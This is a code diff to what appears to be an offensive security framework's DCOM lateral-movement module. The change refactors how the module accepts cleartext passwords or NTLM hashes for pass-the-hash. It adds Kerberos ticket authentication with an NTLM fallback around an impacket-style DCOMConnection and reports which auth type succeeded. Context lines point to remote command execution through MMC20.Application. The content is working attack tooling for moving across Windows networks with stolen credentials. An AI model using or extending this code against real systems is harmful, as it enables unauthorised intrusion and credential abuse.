@@ -29,7 +29,7 @@ from typing import Any
 from ares.core.logger import get_logger, audit
 from ares.core.security import sanitize_hostname
 from ares.modules.lateral.modules import (
-    BaseLateralModule, LateralResult, LateralTechnique,
+    BaseLateralModule, LateralResult, LateralTechnique, AuthStrategy,
 )
 from ares.modules.base import OpsecLevel
 from ares.modules.params import DCOMParams
@@ -258,22 +258,8 @@ class DCOMLateral(BaseLateralModule):
                 duration_ms=round((time.monotonic() - t0) * 1000, 2),
             )
 
-        # Parse credential - support cleartext and NTLM hash
-        lmhash, nthash = "", ""
-        password = secret
-        if ":" in secret and len(secret) in (65, 33):
-            parts = secret.split(":")
-            if len(parts) == 2 and all(
-                all(c in "0123456789abcdefABCDEF" for c in p)
-                for p in parts
-            ):
-                lmhash, nthash = parts[0], parts[1]
-                password = ""
-        elif len(secret) == 32 and all(
-            c in "0123456789abcdefABCDEF" for c in secret
-        ):
-            nthash   = secret
-            password = ""
+        # Parse credential - support cleartext, NTLM hash, and Kerberos ticket
+        auth = self.resolve_auth_strategy(secret, domain, username, **kwargs)
 
         loop = asyncio.get_running_loop()
 
@@ -284,16 +270,33 @@ class DCOMLateral(BaseLateralModule):
             """
             dcom = None
             try:
-                dcom = DCOMConnection(
-                    target,
-                    username=username,
-                    password=password,
-                    domain=domain,
-                    lmhash=lmhash,
-                    nthash=nthash,
-                    oxidResolver=True,
-                    doKerberos=False,
-                )
+                try:
+                    dcom = DCOMConnection(
+                        target,
+                        username=username,
+                        password=auth.password,
+                        domain=domain,
+                        lmhash=auth.lmhash,
+                        nthash=auth.nthash,
+                        oxidResolver=True,
+                        doKerberos=auth.do_kerberos,
+                        kdcHost=auth.kdc_host or domain or target,
+                    )
+                except Exception as krb_err:
+                    if auth.do_kerberos and (auth.password or auth.nthash):
+                        logger.debug("dcom_kerberos_failed_fallback_ntlm", error=str(krb_err)[:80])
+                        dcom = DCOMConnection(
+                            target,
+                            username=username,
+                            password=auth.password,
+                            domain=domain,
+                            lmhash=auth.lmhash,
+                            nthash=auth.nthash,
+                            oxidResolver=True,
+                            doKerberos=False,
+                        )
+                    else:
+                        raise
 
                 # ── Method 1: MMC20.Application ───────────────────────────
                 # Most widely supported, requires local admin.
@@ -380,4 +383,6 @@ class DCOMLateral(BaseLateralModule):
             output       = output,
             error        = "" if success else output,
             duration_ms  = round((time.monotonic() - t0) * 1000, 2),
+            auth_type    = auth.auth_type,
+            kerberos_used = auth.do_kerberos and success,
         )
